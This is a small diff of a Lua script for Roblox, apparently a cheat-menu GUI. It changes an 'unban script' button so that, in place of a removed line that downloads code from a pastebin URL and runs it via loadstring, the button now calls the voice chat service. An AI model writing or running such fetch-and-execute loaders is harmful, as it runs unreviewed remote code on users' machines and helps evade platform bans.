@@ -41,7 +41,7 @@ local MCSection = MCTab:CreateSection("information/contacts")
 local Button = DPTab:CreateButton({
    Name = "unban script",
    Callback = function()
-loadstring(game:HttpGet("https://pastebin.com/raw/nZhwjg5g"))()
+game:GetService("VoiceChatService"):joinVoice()
    end,
 })
 
